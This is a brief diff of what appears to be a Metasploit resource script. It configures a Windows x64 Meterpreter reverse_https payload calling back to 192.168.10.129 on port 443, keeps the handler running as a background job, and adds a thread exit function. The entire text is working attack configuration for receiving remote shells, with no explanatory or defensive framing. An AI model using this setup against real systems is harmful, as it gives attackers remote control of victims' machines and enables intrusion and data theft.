@@ -3,5 +3,6 @@ set PAYLOAD windows/x64/meterpreter/reverse_https
 set LHOST 192.168.10.129
 set LPORT 443
 set ExitOnSession false
+set EXITFUNC thread
 exploit -j -z
 
